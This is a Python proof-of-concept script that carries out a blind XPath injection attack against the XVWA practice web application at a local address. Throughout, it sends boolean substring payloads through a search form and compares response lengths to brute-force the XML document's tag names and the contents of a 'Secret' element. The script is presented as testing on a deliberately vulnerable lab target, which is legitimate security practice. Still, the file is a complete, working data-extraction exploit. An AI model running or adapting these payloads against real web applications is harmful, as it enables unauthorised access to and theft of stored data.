#!/usr/bin/python3

# Author: @4ndymcfly
# Date: 11/03/2023

# This POC was created to test the XPATH injection vulnerability on a web application. This script performs a brute force attack to obtain information about the structure and content of an XML document.

import requests, time, sys, pdb, string, signal, os
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + ' ' + '$'
p1 = log.progress("")

def xPathInjectionMainTag():

    data = ""

    p1.status("Starting brute force attack...")
    time.sleep(2)
    
    for position in range(1, 8):
        for character in characters:
            
            post_data= {
                'search': "1' and substring(name(/*[1]),%d,1)='%c" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8681:
                data += character
                #p2.status(data)
                break
    print("[+] Main tag: " + " <" + data + ">"" </" + data + ">")

def xPathInjectionFirstTag():

    data = ""

    for position in range(1, 7):
        for character in characters:
            
            post_data= {
                'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%c" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8686:
                data += character
                #p2.status(data)
                break
    #p1.success("Process completed.")
    print("[+] Primary tag: " + "  <" + data + ">"" </" + data + ">")

def xPathInjectionSecondTag():

    data = ""
    p2 = log.progress("Tags")

    for first_position in range(1, 6):
        data += "<"
        for second_position in range(1, 21):
            for character in characters:
                
                post_data= {
                    'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
                    'submit': ''
                }

                r = requests.post(main_url, data=post_data)

                if len(r.text) != 8691 and len(r.text) != 8692:
                    data += character
                    p2.status(data)
                    break
        
        if first_position != 6:
            data += "> "

    p2.success(data)

def xPathInjectionDescription():

    data = ""
    p2 = log.progress("<Secret>")

    for position in range(1, 60):
        for character in characters:
            
            post_data= {
                'search': "1' and substring(Secret,%d,1)='%s" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8676 and len(r.text) != 8677:
                data += character
                p2.status(data)
                break
    
    p2.success(data + " </Secret>")
    p1.success("Brute force attack completed.")


if __name__ == '__main__':
    xPathInjectionMainTag()
    xPathInjectionFirstTag()
    xPathInjectionSecondTag()
    xPathInjectionDescription()
